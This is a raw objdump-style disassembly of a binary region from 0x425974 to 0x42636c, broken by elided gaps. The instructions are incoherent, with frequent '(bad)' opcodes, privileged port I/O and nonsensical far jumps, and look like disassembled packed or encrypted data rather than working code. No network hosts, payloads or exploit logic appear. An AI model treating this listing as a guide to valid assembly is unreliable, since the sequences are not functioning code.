  425974:	call   0x5cba:0x430c98
  42597b:	fcomp  DWORD PTR [eax]
  42597d:	or     DWORD PTR [eax+0x29],eax
  425980:	ret    
  425981:	xor    al,0xa0
  425983:	inc    ebp
  425984:	fst    DWORD PTR [edx+0xe]
  425987:	ret    
  425988:	es mov ecx,0xa36f76f1
  42598e:	xchg   ecx,eax
  42598f:	popf   
  425990:	and    eax,ecx
  425992:	(bad)  
  425993:	out    0x3a,al
  425995:	aad    0xf0
  425997:	mov    ebx,0x846f0124
  42599c:	in     eax,0x4d
  42599e:	popf   
  42599f:	sbb    ecx,esi
  4259a1:	repnz or DWORD PTR [ebx+0x4902840e],ebp
  4259a8:	jae    0x4259cb
  4259aa:	push   edi
  4259ab:	lea    edx,[esi+0x3f]
  4259ae:	jmp    0x72155cf5
  4259b3:	daa    
  4259b4:	js     0x42595a
  4259b6:	mov    cl,0x62
  4259b8:	sbb    BYTE PTR [ebp-0xb],bl
  4259bb:	dec    eax
  4259bc:	iret   
  4259bd:	pushf  
  4259be:	add    DWORD PTR ds:0xd1ed39c,eax
  4259c4:	mov    edx,0x78533de6
  4259c9:	mov    ah,0x7f
  4259cb:	fsubr  DWORD PTR [edi-0x76]
  4259ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259cf:	mov    esp,0xe7b3fabb
  4259d4:	mov    ah,0x13
  4259d6:	cmp    edi,edi
  4259d8:	out    dx,eax
  4259d9:	mov    bh,al
  4259db:	pop    ebp
  4259dc:	sbb    ebp,eax
  4259de:	pop    edx
  4259df:	cmp    cl,BYTE PTR ds:0x6f9922ff
  4259e5:	icebp  
  4259e6:	fmul   st(4),st
  4259e8:	or     edi,esp
  4259ea:	and    ebp,0xffffffa2
  4259ed:	mov    cl,0x57
  4259ef:	mov    cl,0xf5
  4259f1:	int3   
  4259f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f3:	sti    
  4259f4:	dec    edi
  4259f5:	push   ebp
  4259f6:	scas   eax,DWORD PTR es:[edi]
  4259f7:	mov    esp,0x74cdf5e6
  4259fc:	inc    ecx
  4259fd:	inc    esp
  4259fe:	imul   ebx,eax,0xffffffb9
  425a01:	bound  esp,QWORD PTR [esi+0x63d28ef1]
  425a07:	repnz push esi
  425a09:	mov    edx,0xcd87abec
  425a0e:	adc    ecx,esi
  425a10:	outs   dx,BYTE PTR ds:[esi]
  425a11:	and    ebp,ebp
  425a13:	mov    eax,ds:0x5f180da
  425a18:	xor    al,0x17
  425a1a:	jae    0x4259bd
  425a1c:	dec    edi
  425a1d:	xchg   edx,eax
  425a1e:	sbb    edx,DWORD PTR [ecx-0x76ecac22]
  425a24:	or     BYTE PTR [edx],dh
  425a26:	dec    esp
  425a27:	addr16 jle 0x425a78
  425a2a:	outs   dx,DWORD PTR ds:[esi]
  425a2b:	jmp    DWORD PTR [ecx+ecx*8+0x39]
  425a2f:	mov    eax,ds:0xcabc7f0e
  425a34:	mov    edx,0xee109d72
  425a39:	in     al,dx
  425a3a:	push   ss
  425a3b:	jnp    0x425a04
  425a3d:	xor    DWORD PTR [eax-0x5e],ebp
  425a40:	inc    ecx
  425a41:	cmp    al,0x8d
  425a43:	jae    0x4259f7
  425a45:	fst    QWORD PTR [ecx-0x5e0a081]
  425a4b:	outs   dx,DWORD PTR ds:[esi]
  425a4c:	cmp    al,0xdd
  425a4e:	jnp    0x425a1a
  425a50:	or     esp,DWORD PTR [ebx]
  425a52:	push   0xcfed6515
  425a57:	or     eax,ebx
  425a59:	cli    
  425a5a:	stc    
  425a5b:	or     BYTE PTR [eax-0x74],0xb9
  425a5f:	xchg   ebx,eax
  425a60:	ins    DWORD PTR es:[edi],dx
  425a61:	stos   BYTE PTR es:[edi],al
  425a62:	mov    ah,BYTE PTR [edx+0x4dc867a9]
  425a68:	cmc    
  425a69:	push   edi
  425a6a:	outs   dx,DWORD PTR ds:[esi]
  425a6b:	fsubr  DWORD PTR ds:0xa7
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x7d1addd]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	xlat   BYTE PTR ds:[ebx]
  425aef:	and    al,bl
  425af1:	add    DWORD PTR [ecx],esp
  425af3:	mov    ds:0x81e148e,al
  425af8:	sbb    al,0x3a
  425afa:	pop    ds
  425afb:	push   ebx
  425afc:	mov    ebp,0xc0365708
  425b01:	and    eax,0x6b38799
  425b06:	cmp    DWORD PTR [ebx],esi
  425b08:	and    eax,0xec65bf77
  425b0d:	jne    0x425a94
  425b0f:	sbb    si,WORD PTR [ecx+eiz*4-0x63]
  425b14:	in     eax,0xf4
  425b16:	cdq    
  425b17:	pusha  
  425b18:	ror    BYTE PTR [ecx+eax*2],0x7e
  425b1c:	add    eax,0xb9fbfc59
  425b21:	mov    ebx,0x4363461e
  425b26:	popa   
  425b27:	out    dx,al
  425b28:	test   BYTE PTR [edi],ch
  425b2a:	in     al,0xee
  425b2c:	add    eax,0x92728c5b
  425b31:	test   eax,0x79775117
  425b36:	test   eax,0x6040e177
  425b3b:	stc    
  425b3c:	jbe    0x425b4e
  425b3e:	and    dh,0x98
  425b41:	cdq    
  425b42:	mov    esp,0x6c391330
  425b47:	inc    ebx
  425b48:	sub    bh,BYTE PTR [ebp+0x53]
  425b4b:	cs jb  0x425b85
  425b4e:	aad    0xd3
  425b50:	addr16 dec ebp
  425b52:	outs   dx,DWORD PTR ds:[esi]
  425b53:	add    BYTE PTR [edx-0x33],dl
  425b56:	out    dx,al
  425b57:	es int 0xa5
  425b5a:	mov    ebx,0x66c95e7f
  425b5f:	fld    QWORD PTR [eax+edi*1]
  425b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b63:	sub    ch,BYTE PTR [ecx+0xe]
  425b66:	(bad)  
  425b67:	(bad)  
  425b69:	test   BYTE PTR [ebx-0x3c],cl
  425b6c:	cs or  eax,0xa241ea3b
  425b72:	fistp  QWORD PTR [ebx]
  425b74:	mov    bh,0x1f
  425b76:	pushf  
  425b77:	and    al,0x17
  425b79:	xchg   esi,eax
  425b7a:	lods   eax,DWORD PTR ds:[esi]
  425b7b:	xchg   ebp,eax
  425b7c:	push   ebp
  425b7d:	cmc    
  425b7e:	push   esi
  425b7f:	pop    ebp
  425b80:	cmp    bl,al
  425b82:	cli    
  425b83:	ret    
  425b84:	retf   
  425b85:	cdq    
  425b86:	outs   dx,BYTE PTR ds:[esi]
  425b87:	sahf   
  425b88:	jbe    0x425b55
  425b8a:	pop    eax
  425b8b:	stos   BYTE PTR es:[edi],al
  425b8c:	add    BYTE PTR [edi+ebx*4-0x637d5551],0x5
  425b94:	test   DWORD PTR [eax+0x5b],esi
  425b97:	add    al,0xef
  425b99:	xlat   BYTE PTR ds:[ebx]
  425b9a:	fcomp  DWORD PTR [ecx-0x3d]
  425b9d:	fidiv  WORD PTR [edi+0x22cd8a97]
  425ba3:	and    bl,BYTE PTR [ebp+0x33]
  425ba6:	or     DWORD PTR ds:[ecx],0xffffffc2
  425baa:	adc    edx,ebp
  425bac:	sbb    bl,BYTE PTR [ecx+eiz*1-0x41775926]
  425bb3:	xchg   DWORD PTR [ebx+eax*1+0x49af915e],eax
  425bba:	sbb    eax,0x3836a310
  425bbf:	xlat   BYTE PTR ds:[ebx]
  425bc0:	push   edx
  425bc1:	add    ah,BYTE PTR [esi]
  425bc3:	push   0xffffffb3
  425bc5:	sbb    al,0xc9
  425bc7:	sahf   
  425bc8:	add    al,0xb5
  425bca:	push   eax
  425bcb:	fldenv [ecx+edi*1-0x87670fe]
  425bd2:	out    dx,eax
  425bd3:	mov    bh,0xfa
  425bd5:	out    0x78,eax
  425bd7:	jmp    0x1b30:0x5ba1610a
  425bde:	mov    cl,0xd7
  425be0:	adc    eax,0xbfb7c310
  425be5:	in     eax,dx
  425be6:	dec    edi
  425be7:	fimul  WORD PTR [ecx]
  425be9:	nop
  425bea:	(bad)  
  425beb:	in     al,0xf5
  425bed:	rol    BYTE PTR [eax],cl
	...
  425c53:	add    BYTE PTR [eax],al
  425c55:	add    ah,al
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	and    eax,0x67bf6f62
  425c67:	xchg   ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	int    0x3f
  425c70:	cmp    al,0xc0
  425c72:	sbb    al,0xc9
  425c74:	mov    ebx,0xf0015943
  425c79:	push   edi
  425c7a:	daa    
  425c7b:	pop    ecx
  425c7c:	and    eax,0x3bbdb484
  425c81:	xor    ch,BYTE PTR [ecx]
  425c83:	sub    al,0x8
  425c85:	push   edx
  425c86:	add    eax,0x1e6323b6
  425c8b:	in     al,0x7a
  425c8d:	cmp    BYTE PTR [edx+0x31],0xa6
  425c91:	push   ss
  425c92:	lods   al,BYTE PTR ds:[esi]
  425c93:	in     eax,0x72
  425c95:	mov    BYTE PTR [ebp+0x4a],bh
  425c98:	xchg   esp,eax
  425c99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c9a:	or     ebp,edx
  425c9c:	gs out dx,eax
  425c9e:	jb     0x425cf3
  425ca0:	add    eax,0x3d16f6e7
  425ca5:	stc    
  425ca6:	js     0x425c73
  425ca8:	aad    0x1
  425caa:	aad    0x6c
  425cac:	jns    0x425cb8
  425cae:	add    BYTE PTR [ebx+0x137afa99],ah
  425cb4:	sti    
  425cb5:	arpl   WORD PTR [ebx],bx
  425cb7:	retf   0x93d8
  425cba:	pushf  
  425cbb:	popa   
  425cbc:	mov    BYTE PTR ds:0x2ed0f215,dh
  425cc2:	retf   0xc81f
  425cc5:	cmp    dl,BYTE PTR [ecx+0x4c]
  425cc8:	ds (bad) 
  425cca:	es out dx,al
  425ccc:	inc    edi
  425ccd:	dec    eax
  425cce:	jmp    0x8773:0x2c73ac61
  425cd5:	mov    al,0x5f
  425cd7:	ins    BYTE PTR es:[edi],dx
  425cd8:	mov    bl,0xa0
  425cda:	test   eax,0x7fd7cb11
  425cdf:	int    0xc8
  425ce1:	test   eax,0x24bb00a3
  425ce6:	pop    esi
  425ce7:	jns    0x425d64
  425ce9:	cli    
  425cea:	add    cl,BYTE PTR [esi*2-0x4d910183]
  425cf1:	jo     0x425cfe
  425cf3:	xchg   edi,eax
  425cf4:	outs   dx,DWORD PTR ds:[esi]
  425cf5:	ret    
  425cf6:	lds    ecx,FWORD PTR [ecx]
  425cf8:	push   esi
  425cf9:	or     edi,edx
  425cfb:	push   edi
  425cfc:	inc    edi
  425cfd:	jo     0x425cec
  425cff:	rol    bh,1
  425d01:	ins    BYTE PTR es:[edi],dx
  425d02:	adc    BYTE PTR [ebx-0x2c],ch
  425d05:	add    esi,DWORD PTR [edi+0x36]
  425d08:	mov    ds:0xb3d6b7f4,al
  425d0d:	xchg   ah,cl
  425d0f:	in     eax,0x17
  425d11:	outs   dx,DWORD PTR ds:[esi]
  425d12:	push   edi
  425d13:	enter  0x9d81,0xbb
  425d17:	int    0x44
  425d19:	sbb    bl,BYTE PTR [esi]
  425d1b:	sbb    dl,0x2a
  425d1e:	std    
  425d1f:	cmp    eax,0x484437a0
  425d24:	or     dl,BYTE PTR [ebp+0x229490e4]
  425d2a:	scas   eax,DWORD PTR es:[edi]
  425d2b:	xchg   DWORD PTR [eax+ebp*8-0x1042aefc],ebx
  425d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d33:	mov    ah,0xa1
  425d35:	(bad)  [ecx]
  425d37:	test   al,0x9c
  425d39:	add    BYTE PTR [eax+0x287799f4],bh
  425d3f:	test   DWORD PTR [ebx],edi
  425d41:	inc    esp
  425d42:	call   0x81d3:0x335e20cb
  425d49:	hlt    
  425d4a:	xchg   ebx,eax
  425d4b:	inc    ebx
  425d4c:	dec    eax
  425d4d:	retf   0xbc6
  425d50:	(bad)  
  425d51:	pop    esi
  425d52:	xor    BYTE PTR [ebx+0x78],0x1a
  425d56:	jb     0x425d34
  425d58:	push   0x23c88c80
  425d5d:	in     al,dx
  425d5e:	mul    DWORD PTR [esi]
  425d60:	push   edi
  425d61:	sbb    eax,DWORD PTR [edx-0x65b103f4]
  425d67:	ins    DWORD PTR es:[edi],dx
  425d68:	add    eax,0xdc50810a
  425d6d:	fld    QWORD PTR [eax]
	...
  425dd3:	add    BYTE PTR [eax],al
  425dd5:	add    bh,bh
  425dd7:	lods   al,BYTE PTR ds:[esi]
  425dd8:	fadd   QWORD PTR [edi]
  425dda:	fbstp  TBYTE PTR [edi-0x1]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0xc6c016f3,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	mov    esp,0xf9f48aff
  425df3:	stc    
  425df4:	xchg   ecx,eax
  425df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425df6:	loop   0x425d82
  425df8:	out    dx,eax
  425df9:	stos   BYTE PTR es:[edi],al
  425dfa:	pop    esi
  425dfb:	add    cl,BYTE PTR [edx]
  425dfd:	aad    0x7d
  425dff:	test   DWORD PTR [ebp+0x318887e2],esp
  425e05:	adc    DWORD PTR [eax],edx
  425e07:	and    eax,0xfaa43928
  425e0c:	jmp    edx
  425e0e:	push   es
  425e0f:	add    BYTE PTR [ebx],dh
  425e11:	shl    DWORD PTR [ebx-0x1deb1271],0xf2
  425e18:	(bad)  
  425e19:	das    
  425e1a:	mov    ds:0xed1a3cb7,al
  425e1f:	fist   WORD PTR ds:0xdb7fc51a
  425e25:	sbb    eax,0xadf9e482
  425e2a:	data16 repnz cmp BYTE PTR [ebx+edi*8+0x15],dh
  425e30:	imul   edx,DWORD PTR [edx+ecx*2-0x3c],0x5c527c5c
  425e38:	xor    DWORD PTR [eax-0x70665a97],esp
  425e3e:	jb     0x425eb9
  425e40:	mov    al,0xff
  425e42:	cdq    
  425e43:	lods   eax,DWORD PTR ds:[esi]
  425e44:	dec    eax
  425e45:	loope  0x425e0e
  425e47:	mov    esi,0x301213ac
  425e4c:	or     al,0x3d
  425e4e:	dec    edx
  425e4f:	ds pop ecx
  425e51:	inc    edx
  425e52:	mov    eax,0x7a0a8c19
  425e57:	xor    BYTE PTR [ecx],bl
  425e59:	jge    0x425dff
  425e5b:	jmp    0xc22a:0x794a1639
  425e62:	push   ds
  425e63:	mov    ebp,0xd89dde00
  425e68:	into   
  425e69:	retf   
  425e6a:	inc    esi
  425e6b:	stc    
  425e6c:	jnp    0x425e3d
  425e6e:	ja     0x425e44
  425e70:	push   esi
  425e71:	out    dx,eax
  425e72:	jecxz  0x425e62
  425e74:	dec    edx
  425e75:	mov    DWORD PTR [eax+0x4b],eax
  425e78:	jae    0x425ebf
  425e7a:	dec    ebx
  425e7b:	inc    edi
  425e7c:	gs cmc 
  425e7e:	in     al,0x67
  425e80:	ins    BYTE PTR es:[edi],dx
  425e81:	mov    al,0x51
  425e83:	or     esi,DWORD PTR [ebx+edx*2-0x6f0bace1]
  425e8a:	std    
  425e8b:	repz call 0x29cd5796
  425e91:	les    esi,FWORD PTR [ebx]
  425e93:	loope  0x425e4f
  425e95:	rcl    DWORD PTR [eax],1
  425e97:	or     al,0x3d
  425e99:	outs   dx,BYTE PTR ds:[esi]
  425e9a:	mov    ch,0xa1
  425e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e9d:	les    ecx,FWORD PTR [ecx+0x5a]
  425ea0:	jmp    FWORD PTR [edx+0x48]
  425ea3:	adc    eax,0xcbc72de5
  425ea8:	call   0x417ae556
  425ead:	arpl   si,sp
  425eaf:	fs test edi,edi
  425eb2:	addr16 or al,dh
  425eb5:	scas   al,BYTE PTR es:[edi]
  425eb6:	xchg   edi,eax
  425eb7:	sbb    BYTE PTR [ecx-0x1aee5373],dl
  425ebd:	mov    edx,0xee7c4e71
  425ec2:	mov    dl,0x96
  425ec4:	mov    edi,0x1ec4c95f
  425ec9:	cmp    al,0xd3
  425ecb:	jmp    0x143a:0x1442878e
  425ed2:	xor    BYTE PTR ds:0x32790638,dl
  425ed8:	jmp    0x5ee4:0xd809f8ee
  425edf:	out    dx,eax
  425ee0:	sahf   
  425ee1:	fdiv   QWORD PTR [ecx-0x66]
  425ee4:	pop    ebp
  425ee5:	mov    WORD PTR [esi-0x51],ds
  425ee8:	ror    BYTE PTR [ebp-0x58],0x90
  425eec:	add    BYTE PTR [eax+eax*1],bl
	...
  425f53:	add    BYTE PTR [eax],al
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	push   ds
  425f63:	shl    DWORD PTR [ecx+0x19767b6],cl
  425f69:	add    BYTE PTR [eax],al
  425f6b:	add    DWORD PTR [eax],eax
  425f6d:	add    BYTE PTR ds:0xbb46e3bb,cl
  425f73:	xor    eax,0xea55c7f9
  425f78:	rol    eax,cl
  425f7a:	(bad)  
  425f7b:	jnp    0x425f0a
  425f7d:	loopne 0x425f4f
  425f7f:	add    esi,DWORD PTR [edx-0x69]
  425f82:	and    edx,DWORD PTR gs:[ecx+0x56]
  425f86:	push   esp
  425f87:	repnz xor eax,DWORD PTR [edx+edi*8-0x7fd0f3bf]
  425f8f:	xor    eax,0x5b07cf07
  425f94:	jmp    0x425f31
  425f96:	mov    DWORD PTR [eax+0x74],edx
  425f99:	pop    ss
  425f9a:	sbb    edi,DWORD PTR [esp+esi*1]
  425f9d:	mov    ss,WORD PTR [ecx+0x1d0cd523]
  425fa3:	dec    edi
  425fa4:	sbb    BYTE PTR [esi+0x6],al
  425fa7:	call   0x19483a9e
  425fac:	xchg   esp,eax
  425fad:	and    DWORD PTR [esi-0x7e14871e],edx
  425fb3:	mov    esp,0x4b92c096
  425fb8:	mov    al,ds:0xca07765b
  425fbd:	call   0x4b5d9174
  425fc2:	xchg   esi,eax
  425fc3:	loopne 0x426016
  425fc5:	mov    es,WORD PTR [edi]
  425fc7:	or     eax,0x26047b
  425fcc:	mov    edx,0xd957b88f
  425fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fd2:	je     0x425fa5
  425fd4:	mov    BYTE PTR [esi+0x7f70d346],0x65
  425fdb:	push   ebp
  425fdc:	xchg   esp,eax
  425fdd:	push   cs
  425fde:	rol    DWORD PTR [esi],cl
  425fe0:	ds into 
  425fe2:	mov    ss,WORD PTR [eax+0x53f8e968]
  425fe8:	pop    ecx
  425fe9:	push   edi
  425fea:	iret   
  425feb:	mov    ds:0x5bd0a40,al
  425ff0:	inc    eax
  425ff1:	pop    edx
  425ff2:	or     DWORD PTR [edi+0x46],ecx
  425ff5:	jg     0x426065
  425ff7:	mov    WORD PTR [ebx-0xba531dd],es
  425ffd:	or     edi,DWORD PTR [ebx-0x41]
  426000:	inc    eax
  426001:	std    
  426002:	rol    bl,1
  426004:	fbstp  TBYTE PTR [ebp-0x4abc7968]
  42600a:	pop    esi
  42600b:	shr    DWORD PTR [ebx+0x48c88ea1],0x85
  426012:	dec    edx
  426013:	(bad)  
  426014:	js     0x425fe0
  426016:	adc    al,0x57
  426018:	or     eax,0xeea17db4
  42601d:	pop    ecx
  42601e:	or     al,0x4c
  426020:	jle    0x426067
  426022:	aam    0xd2
  426024:	fisub  WORD PTR [edi-0x15234cfe]
  42602a:	data16 shr BYTE PTR [eax-0x1af46838],cl
  426031:	aas    
  426032:	cs ds addr16 (bad) 
  426037:	ja     0x425fca
  426039:	push   ecx
  42603a:	mov    bl,0x7
  42603c:	loop   0x426070
  42603e:	jnp    0x426040
  426040:	xlat   BYTE PTR ds:[ebx]
  426041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426042:	dec    ebp
  426043:	pop    ss
  426044:	adc    al,0xf5
  426046:	sbb    eax,0xeef1861
  42604b:	out    0xca,al
  42604d:	mov    DWORD PTR [edi-0x454fe75a],esi
  426053:	sar    BYTE PTR [eax+0xc],cl
  426056:	xor    esi,DWORD PTR [ebx+eiz*8]
  426059:	push   ebx
  42605a:	dec    esp
  42605b:	ss cdq 
  42605d:	cs sbb cl,dl
  426060:	test   BYTE PTR [eax-0x71],bh
  426063:	xchg   ebp,eax
  426064:	push   edx
  426065:	xor    ecx,DWORD PTR [esi]
  426067:	enter  0xa9e6,0xff
  42606b:	sbb    ebp,ebp
  42606d:	cmp    al,0x0
	...
  4260d3:	add    BYTE PTR [eax],al
  4260d5:	add    BYTE PTR [ecx],bh
  4260d7:	cwde   
  4260d8:	or     eax,DWORD PTR [esi]
  4260da:	stos   DWORD PTR es:[edi],eax
  4260db:	xchg   edi,eax
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	aam    0x7e
  4260e4:	dec    edi
  4260e5:	sti    
  4260e6:	addr16 cwde 
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	mov    ds:0xdb701dbe,al
  4260f3:	ror    BYTE PTR ds:0x3b42f5eb,cl
  4260f9:	fwait
  4260fa:	adc    al,0x49
  4260fc:	enter  0xbdf,0xab
  426100:	pop    ebp
  426101:	(bad)  
  426103:	push   esi
  426104:	dec    ebp
  426105:	xor    edx,0xfffffff9
  426108:	(bad)  
  426109:	xor    edx,ebp
  42610b:	(bad)  
  42610c:	mov    es,WORD PTR [edx*4-0x36b40e3f]
  426113:	out    dx,al
  426114:	es and al,0x21
  426117:	jno    0x426139
  426119:	shr    DWORD PTR [ebp+0x1c87d54c],1
  42611f:	dec    ecx
  426120:	xchg   edi,eax
  426121:	ss sub al,0x49
  426124:	rcr    ebx,cl
  426126:	sbb    eax,0x21b227e7
  42612b:	mov    eax,ds:0xb8b8518b
  426130:	dec    edx
  426131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426132:	in     al,0xa1
  426134:	(bad)  
  426135:	sbb    BYTE PTR [edi],ah
  426137:	je     0x426198
  426139:	mov    dl,0x1b
  42613b:	test   al,0x7d
  42613d:	shr    DWORD PTR [ebx-0xd],1
  426140:	mov    dh,0x41
  426142:	lahf   
  426143:	div    DWORD PTR [ecx+0xd]
  426146:	stc    
  426147:	aas    
  426148:	jmp    0x9e71:0x49bc147b
  42614f:	cs mov edx,0x5edc6dd0
  426155:	xchg   ebx,eax
  426156:	mov    esi,0x908b6109
  42615b:	adc    BYTE PTR ds:0xaacd9625,bh
  426161:	jbe    0x426172
  426163:	ret    0xabef
  426166:	sti    
  426167:	cmp    esp,edi
  426169:	popf   
  42616a:	test   ecx,eax
  42616c:	pop    ds
  42616d:	in     al,0x2c
  42616f:	add    esp,DWORD PTR [ecx+ebx*4-0x1d]
  426173:	idiv   DWORD PTR [esi+eiz*4+0x6732ffd9]
  42617a:	nop
  42617b:	sub    al,ah
  42617d:	dec    eax
  42617e:	cwde   
  42617f:	inc    ebx
  426180:	aaa    
  426181:	ins    BYTE PTR es:[edi],dx
  426182:	scas   al,BYTE PTR es:[edi]
  426183:	mov    dh,0xb1
  426185:	xchg   esp,eax
  426186:	dec    edx
  426187:	mov    edx,0x44fde591
  42618c:	mov    eax,ds:0xd85a4021
  426191:	add    al,0x9e
  426193:	cs repz xchg edi,eax
  426196:	and    dl,BYTE PTR [ebp-0x739e68ea]
  42619c:	pop    eax
  42619d:	ret    0xcef
  4261a0:	mov    BYTE PTR [eax+0x77],dh
  4261a3:	xchg   DWORD PTR [ebx-0x16],ebx
  4261a6:	sub    DWORD PTR [edi],0xffffffd7
  4261a9:	xor    bl,dh
  4261ab:	mov    eax,0xe5e26819
  4261b0:	adc    cl,BYTE PTR [edx-0x391df94a]
  4261b6:	mov    dl,0x15
  4261b8:	hlt    
  4261b9:	call   0x97d6d5d9
  4261be:	(bad)  [ecx+0x241a839d]
  4261c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261c5:	mov    esp,0x563b1e05
  4261ca:	mov    al,0xe8
  4261cc:	or     al,0x2c
  4261ce:	in     eax,dx
  4261cf:	cmp    esi,DWORD PTR [ebx+0x1b]
  4261d2:	adc    eax,0xe4bf6519
  4261d7:	mov    edx,DWORD PTR [ecx+esi*4]
  4261da:	mov    edi,0xf0d90c3f
  4261df:	repnz mov eax,ds:0xc2c5b3ff
  4261e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261e6:	jmp    0x4261e9
  4261e8:	fld    DWORD PTR [eax-0x60]
  4261eb:	sbb    al,0x27
  4261ed:	lds    eax,FWORD PTR [eax]
	...
  426253:	add    BYTE PTR [eax],al
  426255:	add    BYTE PTR [ebx-0x409ef0df],bl
  42625b:	outs   dx,DWORD PTR ds:[esi]
  42625c:	(bad)  
  42625d:	sti    
  42625e:	mov    bh,0x83
  426260:	mov    cl,0x27
  426262:	dec    DWORD PTR [esp+ebx*4]
  426265:	mul    BYTE PTR [edi-0x67]
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	dec    ebx
  42626f:	adc    DWORD PTR [esi+0x8fdfe53],0xffffffc3
  426276:	jge    0x426216
  426278:	add    esp,DWORD PTR [eax+ebp*1+0x74]
  42627c:	(bad)  
  42627d:	mov    bp,0x1d01
  426281:	xchg   al,dl
  426283:	pusha  
  426284:	jmp    0x72d4d098
  426289:	mov    edx,0x1aaefed6
  42628e:	push   edi
  42628f:	adc    BYTE PTR [ecx-0xe],ch
  426292:	add    ebp,ebp
  426294:	jae    0x426226
  426296:	call   0x7c9d5b0b
  42629b:	cmp    eax,ebp
  42629d:	push   ecx
  42629e:	adc    DWORD PTR [ecx+0x34],ebp
  4262a1:	hlt    
  4262a2:	xchg   esp,eax
  4262a3:	loope  0x426266
  4262a5:	xor    cl,BYTE PTR [ecx+0xc315894]
  4262ab:	push   eax
  4262ac:	pop    eax
  4262ad:	mov    WORD PTR [edx+0x2a38d242],ss
  4262b3:	retf   0x5b72
  4262b6:	jnp    0x42624c
  4262b8:	pushf  
  4262b9:	xchg   BYTE PTR [edx+eiz*1+0x1e],dl
  4262bd:	enter  0xe207,0x81
  4262c1:	out    0xd5,eax
  4262c3:	cdq    
  4262c4:	mov    ecx,0x5e5d4fce
  4262c9:	jl     0x42627d
  4262cb:	add    DWORD PTR [eax],edi
  4262cd:	inc    eax
  4262ce:	shl    BYTE PTR [ebx],1
  4262d0:	mov    eax,0x7459ee9c
  4262d5:	xchg   ebx,eax
  4262d6:	out    0x72,al
  4262d8:	and    BYTE PTR [ecx+eiz*8],dl
  4262db:	scas   eax,DWORD PTR es:[edi]
  4262dc:	xlat   BYTE PTR ds:[ebx]
  4262dd:	push   cs
  4262de:	call   0xb4d9dd08
  4262e3:	in     al,0xa2
  4262e5:	jmp    0x34e0:0xaa1add66
  4262ec:	mov    dh,0x6
  4262ee:	stc    
  4262ef:	xor    BYTE PTR cs:[eax-0x77],bl
  4262f3:	sbb    al,0x8f
  4262f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f6:	data16 mov ds:0xa4547bb1,al
  4262fc:	sti    
  4262fd:	loope  0x426334
  4262ff:	xlat   BYTE PTR ds:[ebx]
  426300:	adc    edx,edi
  426302:	pop    esp
  426303:	mov    ah,0x5f
  426305:	cli    
  426306:	adc    dl,ah
  426308:	xor    al,0x67
  42630a:	sbb    al,0x43
  42630c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42630d:	scas   eax,DWORD PTR es:[edi]
  42630e:	outs   dx,DWORD PTR ds:[esi]
  42630f:	and    bh,al
  426311:	xlat   BYTE PTR ds:[ebx]
  426312:	or     DWORD PTR [ebx],esp
  426314:	mov    ss,WORD PTR cs:[edi+0x1e]
  426318:	xchg   ebp,eax
  426319:	sbb    dh,al
  42631b:	outs   dx,BYTE PTR ds:[esi]
  42631c:	ins    DWORD PTR es:[edi],dx
  42631d:	adc    esp,DWORD PTR [esp+ebp*2]
  426320:	adc    DWORD PTR [edx+0x68],ecx
  426323:	and    dl,BYTE PTR ds:0x76884670
  426329:	mov    dl,0xf6
  42632b:	imul   edi,edi,0x5b672793
  426331:	bound  ebx,QWORD PTR [ebp-0x3e86a4c0]
  426337:	pop    ss
  426338:	inc    ebp
  426339:	adc    BYTE PTR [edi],al
  42633b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42633c:	sbb    DWORD PTR [eax*8+0x67750ab2],0x69
  426344:	aad    0x62
  426346:	jns    0x426357
  426348:	mov    bh,0x6b
  42634a:	mov    ds:0x7b543021,al
  42634f:	rcl    DWORD PTR [edx-0x66],0x1b
  426353:	pop    esp
  426354:	adc    al,0xdb
  426356:	test   BYTE PTR [esi+ecx*2],0xa1
  42635a:	add    DWORD PTR [ecx+0x57],edx
  42635d:	inc    ebp
  42635e:	stos   BYTE PTR es:[edi],al
  42635f:	sbb    eax,DWORD PTR [ecx-0x5a2ca8b1]
  426365:	lahf   
  426366:	add    eax,0x8bc5a548
  42636b:	pusha  
  42636c:	jmp    0x0:0xd3
	...
